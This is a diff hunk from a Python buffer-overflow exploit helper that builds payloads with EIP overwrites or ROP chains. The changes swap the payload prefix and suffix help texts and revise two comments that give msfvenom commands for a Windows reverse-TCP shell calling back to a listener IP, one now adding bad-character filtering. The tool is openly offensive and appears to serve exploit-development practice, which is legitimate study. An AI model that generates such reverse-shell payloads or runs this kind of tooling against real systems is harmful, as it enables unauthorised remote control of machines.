@@ -30,24 +30,24 @@ parser.add_argument('-e','--eip', help='Value to overwrite EIP with or ROP chain
 parser.add_argument('-b','--bin', help='Target binary to extract gadgets from. Only ELF!!')
 
 parser.add_argument('-s','--size', help='Payload size', default=-1, type=int)
-parser.add_argument('-sf','--suffix', help='Payload suffix, Ie. USER ', default='')
-parser.add_argument('-pf','--prefix', help="Payload prefix, Ie. \\n", default='')
-parser.add_argument('-a','--arch', help='Target architecture. Ie. x86 or amd64', default='x86')
-parser.add_argument('-O','--os', help='Target OS. Ie. windows or linux', default='linux')
+parser.add_argument('-sf','--suffix', help='Payload suffix, Ie. \\n', default='')
+parser.add_argument('-pf','--prefix', help="Payload prefix, Ie. USER ", default='')
+parser.add_argument('-a','--arch', help='Target architecture. x86 / amd64', default='x86')
+parser.add_argument('-O','--os', help='Target OS. windows / linux', default='linux')
 parser.add_argument('-d','--dry', help='Dry run. Print would be paylad.', action="store_true")
 parser.add_argument('-v','--debug', help='Show debug information', action="store_true")
 
 args = parser.parse_args()
 
 # Save msfvenom output formated as python to shellcode.py in curent dir
-# msfvenom -p windows/shell/reverse_tcp LHOST=10.18.97.196 LPORT=4444 \
+# msfvenom -p windows/shell/reverse_tcp LHOST=10.20.30.40 LPORT=4444 \
 # -f python -a x86 -b "\x00\x09\x0a\x0d\xff" > shellcode.py
 try:
   from shellcode import buf as shellcode
 except ModuleNotFoundError as e:
   parser.error("""Shellcode not present. Create it at shellcode.py
   
-  msfvenom -p windows/shell/reverse_tcp ... -f python -a x86 > shellcode.py
+  msfvenom -p windows/shell/reverse_tcp ... -f python -b "\x00\x09\x0a\x0d\xff" -a x86 > shellcode.py
   """)
 
 if ( not args.eip and not args.bin ):
